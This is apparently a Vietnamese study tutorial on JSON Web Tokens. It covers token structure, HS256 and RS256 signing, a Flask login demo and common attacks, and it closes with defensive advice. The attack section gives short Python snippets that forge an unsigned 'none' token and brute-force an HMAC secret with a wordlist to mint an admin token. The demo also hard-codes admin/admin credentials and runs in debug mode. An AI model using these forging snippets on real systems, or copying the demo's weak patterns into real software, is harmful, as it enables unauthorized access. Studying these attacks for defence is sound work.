<strong>JWT là gì?</strong>

JSON Web Token là một chuẩn mở (RFC 7519) xác định 1 cách nhỏ gọn và khép kín dùng để truyền thông tin 1 cách an toàn giữa các bên dưới dạng đối tượng JSON, Thông tin này được xác thực và tin cậy vì chứa chữ kí số. JWTs có thể được ký bằng 1 thuật toán bí mật(HMAC) hoặc một public/priviate key như RSA

Một ví dụ về JWT Token:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjEzODY4OTkxMzEsImlzcyI6ImppcmE6MTU0ODk1OTUiLCJxc2giOiI4MDYzZmY0Y2ExZTQxZGY3YmM5MGM4YWI2ZDBmNjIwN2Q0OTFjZjZkYWQ3YzY2ZWE3OTdiNDYxNGI3MTkyMmU5IiwiaWF0IjoxMzg2ODk4OTUxfQ.uKqU9dTB6gKwG6jQCuXYAiMNdfNRw98Hw_IWuA5MaMo
```
<strong>Khi nào nên sử dụng JWT?</strong>

Sau đây là 1 số trường hợp thường được sử dụng của JWTs:

 - Xác thực: Đây là trường hợp thường thấy nhất cho việc sử dụng JWT. Khi người dùng đăng nhập thành công, mỗi request tiếp theo sẽ bao gồm JWT, cho phép người dùng truy cập vào các đường dẫn, dịch vụ hoặc tài nguyên được cho phép. Singe Sign On cũng là 1 tính năng phổ biến được sử dụng JWT, bởi vì chi phí nhỏ và khả năng sử dụng dễ dàng trên nhiều miền khác nhau
 - Trao đổi thông tin: JWT là 1 biện pháp hiệu quả để có thể truyền thông tin 1 cách an toàn giữa các bên. Bởi vì JWT có thể được ký – ví dụ: sử dụng cặp public/private key- ta có thể chắc chắn rằng người gửi là người mà họ nói là họ. Ngoài ra, vì chữ ký được tính bằng cách sử dụng header và payload, bạn cũng có thể xác minh rằng nội dung không bị giả mạo.
<strong>Cấu trúc của JWT</strong>
JWT bao gồm 3 phần được tách nhau bằng dấu chấm:
```
Header
Payload
Signature
```
Một ví dụ về JWT Token:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjEzODY4OTkxMzEsImlzcyI6ImppcmE6MTU0ODk1OTUiLCJxc2giOiI4MDYzZmY0Y2ExZTQxZGY3YmM5MGM4YWI2ZDBmNjIwN2Q0OTFjZjZkYWQ3YzY2ZWE3OTdiNDYxNGI3MTkyMmU5IiwiaWF0IjoxMzg2ODk4OTUxfQ.uKqU9dTB6gKwG6jQCuXYAiMNdfNRw98Hw_IWuA5MaMo
````
Thoạt trông phức tạp nhưng cấu trúc của một JWT chỉ đơn giản như sau:

<base64-encoded header>.<base64-encoded payload>.<base64-encoded signature>
# Header
Header thường bao gồm 2 phần: type của token, đó là JWT, và thuật toán được sử dụng
```
{
  "alg": "HS256",
  "typ": "JWT"
}
```
Sau đó, chuỗi JSON này được base64Url encode để tạo thành phần đầu tiên của JWT

# Payload

Phần thứ 2 của 1 JWT là payload chứa các claims. Claims là một các biểu thức về một thực thể (chẳng hạn user) và một số metadata phụ trợ. Có 3 loại claims thường gặp trong Payload: reserved, public và private claims.

 - Reserved claims: Đây là một số metadata được định nghĩa trước: iss (issuer), iat (issued-at time) exp (expiration time), sub (subject), aud (audience), jti (Unique Identifier cho JWT, Can be used to prevent the JWT from being replayed. This is helpful for a one time use token.) … Ví dụ:
```
{
    "iss": "jira:1314039",
    "iat": 1300819370,
    "exp": 1300819380,
    "qsh": "8063ff4ca1e41df7bc90c8ab6d0f6207d491cf6dad7c66ea797b4614b71922e9",
    "sub": "batman",
    "context": {
        "user": {
            "userKey": "batman",
            "username": "bwayne",
            "displayName": "Bruce Wayne"
        }
    }
}
{
  "iss": "scotch.io",
  "exp": 1300819380,
  "name": "Chris Sevilleja",
  "admin": true
}
```
 - Public Claims – Claims được cộng đồng công nhận và sử dụng rộng rãi.
 - Private Claims – Claims tự định nghĩa (không được trùng với Reserved Claims và Public Claims), được tạo ra để chia sẻ thông tin giữa 2 parties đã thỏa thuận và thống nhất trước đó.
Ví dụ 1 payload:
```
{
  "sub": "1234567890",
  "name": "John Doe",
  "admin": true
}
```
Sau đó, payload được mã hóa base64Url để làm phần thứ 2 của JWT

# Signature
Chữ ký Signature trong JWT là một chuỗi được mã hóa bởi header, payload cùng với một chuỗi bí mật theo nguyên tắc sau:
``````
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  secret)
```````
![image](https://github.com/sulsur/HocTap/assets/93130840/567e8f86-8a6e-4e38-bbcc-e8271b9cbe9d)


Do bản thân Signature đã bao gồm cả header và payload nên Signature có thể dùng để kiểm tra tính toàn vẹn của dữ liệu khi truyền tải

# Một số dạng encrypt phổ biến
 - RS256 (RSA Signature with SHA-256) là 1 loại mã hóa bất đối xứng, nó sử dụng cặp public/private key: phía server sở hữu priviate(secret) key để có thể generate signature, và user của JWT sở hữu public key để có thể xác thực signature.

 - HS256 (HMAC with SHA-256) là sự kết hợp của một hàm băm và một secret key được chia sẻ giữa hai bên được sử dụng để tạo hash dùng làm signature.

# Putting all together
Đầu ra là ba chuỗi Base64-URL được phân tách bằng dấu chấm có thể dễ dàng chuyển trong môi trường HTML và HTTP.

![image](https://github.com/sulsur/HocTap/assets/93130840/bbe28256-381f-4ade-aa80-cb1c9ebe88ce)


# How do JSON Web Tokens work?
Trong việc xác thực, khi người dùng thành công đăng nhập, 1 JWT sẽ được trả về, và Token JWT này cần được lưu lại trong Browser của người dùng (thường là LocalStorage hoặc Cookies), thay vì cách truyền thống là tạo một session trên Server và trả về Cookie.

Khi User muốn truy cập vào đường dẫn được bảo vệ (mà chỉ có User đã đăng nhập mới được phép), Browser sẽ gửi token JWT này trong Header Authorization, Bearer schema của request gửi đi.

```Authorization: Bearer <token>```

Demo
```
from flask import Flask, request, jsonify, render_template
import jwt

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your_secret_key'

@app.route('/')
def index():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    data = request.form
    if data['username'] == 'admin' and data['password'] == 'admin':
        token = jwt.encode({'username': data['username']}, app.config['SECRET_KEY'], algorithm='HS256')
        return jsonify({'token': token})
    else:
        return jsonify({'message': 'Invalid username or password'}), 401

@app.route('/protected', methods=['GET'])
def protected():
    token = request.headers.get('Authorization').split(' ')[1]
    try:
        payload = jwt.decode(token, app.config['SECRET_KEY'], algorithms=['HS256'])
        return jsonify({'message': 'Welcome {}'.format(payload['username'])})
    except jwt.ExpiredSignatureError:
        return jsonify({'message': 'Signature expired. Please log in again.'}), 401
    except jwt.InvalidTokenError:
        return jsonify({'message': 'Invalid token. Please log in again.'}), 401

if __name__ == '__main__':
    app.run(host='0.0.0.0', debug=True)

```
# Một số dạng Attack:
## The leakage of sensitive information
Bởi vì payload được truyền đi dưới dạng plaintext, thông tin có thể bị rò rỉ nếu có những thông tin nhạy cảm trong phần payload

## Modify the algorithm to none
Signature algorithm được dùng để ngăn không cho JWT bị thay đổi. Nhưng alg trong header có thể đổi thành none. Một số thư viện JWT support none alg, khi alg được set thành none, backend sẽ không thực hiện việc xác thực chữ kí. Điều này chỉ sảy ra khi phía user parse JWT mà không check thuật toán
Để thực hiện được điều này ta có thể sử dụng thư viện pyjwt(pip install pyjwt)
```
import jwt
encoded = jwt.encode({'username': 'admin'}, '', algorithm='none')
Crack Secretkey(HMAC)
import jwt 
data = open("rockyou.txt", errors = 'ignore').read().split()
 
token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.4kBPNf7Y6BrtP-Y3A-vQXPY9jAh_d0E6L4IUjL65CvmEjgdTZyr2ag-TM-glH6EYKGgO3dBYbhblaPQsbeClcw"
secret = ''
for pw in data: 
    encoded = jwt.encode({"role":"guest"}, pw, algorithm='HS512')
    if (encoded == token) :
        secret = pw
        break
 
print("Secret key is " + secret)
 
admintoken = jwt.encode({"role":"admin"}, secret, algorithm='HS512')
print(admintoken)
```
## Đổi RS256 thành HS256
Ý tưởng tấn công như sau: khi ta đổi thuật toán từ RS256 thành HS256 thì signature sẽ được xác thực bằng thuật toán HS256 sử dụng public key thay cho secret key. Bởi vì public key có thể dễ dàng lấy được, ta có thể dễ dàng giả mạo 1 JWT sử dụng RS256

Và còn nhiều dạng tấn công khác nữa…
https://clbuezzz.wordpress.com/?s=jwt

https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens

## Cách phòng chống Attack.
 - Kiểm tra tính hợp lệ của JWT: Mỗi khi nhận được một JWT, hãy kiểm tra xem nó có hợp lệ không. Điều này bao gồm kiểm tra Signature và thời hạn của JWT.
 - Sử dụng các thư viện và công cụ an toàn: Sử dụng các thư viện JWT đã được kiểm định và bảo trì, thay vì viết code từ đầu.
 - Không lưu trữ dữ liệu nhạy cảm trong JWT: JWT không nên chứa thông tin nhạy cảm như mật khẩu. Thay vào đó, lưu trữ thông tin nhạy cảm trong cơ sở dữ liệu và lưu trữ chỉ số tham chiếu trong JWT.
 - Sử dụng các thuật toán mã hóa mạnh mẽ: Chọn các thuật toán mã hóa như HMAC SHA-256 hoặc RSA với độ dài khóa đủ lớn để đảm bảo tính an toàn.
 - Sử dụng khóa bí mật chặc chẽ: Tránh Brute Force
 - Quản lý thời gian và thời gian hết hạn của JWT: Thiết lập một thời gian hết hạn hợp lý cho JWT để giảm thiểu nguy cơ tấn công làm giả và sử dụng tái JWT.
 - Bảo vệ khỏi tấn công Cross-Site Scripting (XSS): Để chống bị Steal JWT nằm trong Cookie
